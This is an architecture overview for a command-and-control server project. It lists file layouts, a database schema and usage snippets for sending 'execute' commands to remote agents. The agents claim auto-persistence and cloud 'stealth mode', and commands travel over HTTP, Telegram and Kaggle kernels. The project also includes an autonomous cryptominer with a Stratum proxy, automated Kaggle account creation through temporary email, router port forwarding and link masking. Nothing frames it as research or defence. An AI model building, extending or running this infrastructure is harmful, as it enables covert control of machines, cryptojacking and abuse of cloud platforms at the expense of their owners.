# C2 Server - Project Architecture

## Overview

```
C2_server-main/
├── src/
│   ├── c2/           # Core C2 server
│   ├── agents/       # Agent implementations
│   ├── core/         # Core utilities
│   ├── utils/        # Helper utilities
│   ├── mail/         # Email services
│   └── autoreg/      # Auto-registration
├── scripts/          # Utility scripts
├── config/           # Configuration files
├── data/             # Database & storage
├── templates/        # HTML templates
├── static/           # CSS/JS static files
├── docs/             # Documentation
└── tests/            # Test suites
```

## Core Components

### 1. C2 Server (`src/c2/`)

**Main server - 5875 lines**

| File | Lines | Purpose |
|------|-------|---------|
| `server.py` | 5875 | Flask C2 server, API endpoints, web UI |
| `orchestrator.py` | 297 | Integration manager, coordination |
| `telegram_poller.py` | 472 | Telegram C2 transport |
| `autonomous_miner.py` | 282 | Mining automation |
| `models.py` | 213 | SQLAlchemy database models |

**Key Classes:**
- `app` - Flask application
- `Agent` - Database model for agents
- `Task` - Task queue model
- `User` - Operator authentication

### 2. Agents (`src/agents/`)

**Universal Agent - 929 lines**

| File | Lines | Purpose |
|------|-------|---------|
| `universal.py` | 929 | Cross-platform agent (Linux/Mac/Windows/Kaggle) |
| `base.py` | 103 | Base agent class |
| `kaggle/` | - | Kaggle-specific modules |
| `browser/` | - | Browser automation |

**Kaggle Modules:**

| File | Lines | Purpose |
|------|-------|---------|
| `c2_agent.py` | 310 | KaggleC2Agent class |
| `datasets.py` | 1285 | Dataset/Kernel API functions |
| `transport.py` | - | C2 transport layer |
| `telegram_c2.py` | - | Telegram integration |

### 3. Core Utilities (`src/core/`)

| File | Lines | Purpose |
|------|-------|---------|
| `config.py` | 64 | Configuration loader |
| `secrets.py` | 73 | Secret management |
| `health.py` | 39 | Health check endpoints |
| `metrics.py` | 41 | Prometheus metrics |
| `validation.py` | 91 | Input validation |

### 4. Utils (`src/utils/`)

| File | Lines | Purpose |
|------|-------|---------|
| `logger.py` | 383 | Logging system |
| `proxy.py` | 277 | Stratum proxy |
| `rate_limit.py` | 109 | Rate limiting |
| `common.py` | 112 | Common utilities |

### 5. Auto-Registration (`src/autoreg/`)

| File | Lines | Purpose |
|------|-------|---------|
| `engine.py` | - | Job manager, account creation |
| `worker.py` | 2111 | Selenium automation, kernel creation |

### 6. Mail Services (`src/mail/`)

| File | Lines | Purpose |
|------|-------|---------|
| `tempmail.py` | - | Temporary email services |

## Data Flow

```
┌─────────────────────────────────────────────────────────────┐
│                      OPERATOR                                │
│                    (Web UI / API)                            │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│                    C2 SERVER                                 │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │  Flask   │  │ SocketIO │  │ Database │  │  Logger  │    │
│  │  Routes  │  │  Events  │  │ SQLite   │  │  System  │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
└─────────────────────┬───────────────────────────────────────┘
                      │
        ┌─────────────┼─────────────┐
        │             │             │
        ▼             ▼             ▼
┌───────────┐  ┌───────────┐  ┌───────────┐
│  HTTP/S   │  │ Telegram  │  │  Kaggle   │
│ Transport │  │  Poller   │  │   C2      │
└───────────┘  └───────────┘  └───────────┘
        │             │             │
        └─────────────┼─────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│                      AGENTS                                  │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │ Windows  │  │  Linux   │  │  Kaggle  │  │  Colab   │    │
│  │ Agent    │  │  Agent   │  │  Agent   │  │  Agent   │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
└─────────────────────────────────────────────────────────────┘
```

## C2 Channels

### 1. HTTP/S Transport
- Direct connection to C2 server
- Flask routes: `/api/agent/*`
- SocketIO for real-time

### 2. Telegram Transport
- Bot-based C2
- `telegram_poller.py`
- No public URL needed
- Real-time messaging

### 3. Kaggle C2 Channel
- Kernel source as command storage
- `kernels/push` → send commands
- `kernels/pull` → read commands
- Works with private kernels

### 4. Hybrid C2 (Recommended)
- Combines all channels
- Automatic fallback
- Broadcast to all channels
- `hybrid_c2.py`

```python
from agents.kaggle.hybrid_c2 import HybridC2, KaggleKernelChannel, TelegramChannel

# Create channels
kaggle = KaggleKernelChannel(username, api_key)
telegram = TelegramChannel(bot_token, chat_id, agent_id)

# Create hybrid C2
hybrid = HybridC2([kaggle, telegram])

# Send via primary channel
hybrid.send({"action": "execute"})

# Broadcast to ALL channels
hybrid.broadcast({"action": "ping"})

# Receive from ALL channels
commands = hybrid.receive()
```

## Key Functions

### Kaggle C2 (`src/agents/kaggle/c2_agent.py`)

```python
# Create agent
from agents.kaggle.c2_agent import KaggleC2Agent
agent = KaggleC2Agent(username, api_key)

# Send command
agent.send_command({"action": "execute", "target": "system"})

# Get command
commands = agent.get_command()

# Check status
status = agent.check_status()
```

### Universal Agent (`src/agents/universal.py`)

```python
# Auto-detects platform
# Supports: Linux, macOS, Windows, Kaggle, Colab
# Features:
#   - Auto-persistence
#   - Resource optimization
#   - Stealth mode for cloud platforms
```

## Database Schema (`src/c2/models.py`)

```
users
├── id (PK)
├── username
├── password
├── role
└── created_at

agents
├── id (PK)
├── hostname
├── username
├── os
├── ip_external
├── ip_internal
├── last_seen
├── is_alive
├── sleep_interval
└── tasks (1:N)

tasks
├── id (PK)
├── agent_id (FK)
├── command
├── status
├── output
└── created_at
```

## Configuration Files

| File | Purpose |
|------|---------|
| `config/settings.yaml` | Main settings |
| `config/logging.yaml` | Logging config |
| `config/prometheus.yml` | Metrics config |
| `config/render.yaml` | Deployment config |
| `data/accounts.json` | Kaggle accounts |

## Entry Points

| File | Purpose |
|------|---------|
| `run_unified.py` | Main launcher |
| `wsgi.py` | WSGI entry point |
| `gunicorn.conf.py` | Gunicorn config |

## Scripts

| Script | Purpose |
|--------|---------|
| `c2_demo.py` | Kaggle C2 demo |
| `backup.py` | Database backup |
| `sync_db.py` | Database sync |
| `check_pool.py` | Connection pool check |
| `dlink_portforward.py` | Router port forwarding |
| `link_mask.py` | Link masking |

## Deployment

### Local
```bash
python run_unified.py
```

### Docker
```bash
docker-compose up
```

### Render.com
- Uses `render.yaml`
- Auto-deploy from git

## Metrics & Monitoring

- Prometheus metrics at `/metrics`
- Health check at `/api/health`
- SocketIO for real-time updates

## Security

- bcrypt password hashing
- Session-based auth
- Rate limiting
- Input validation
- Secret management
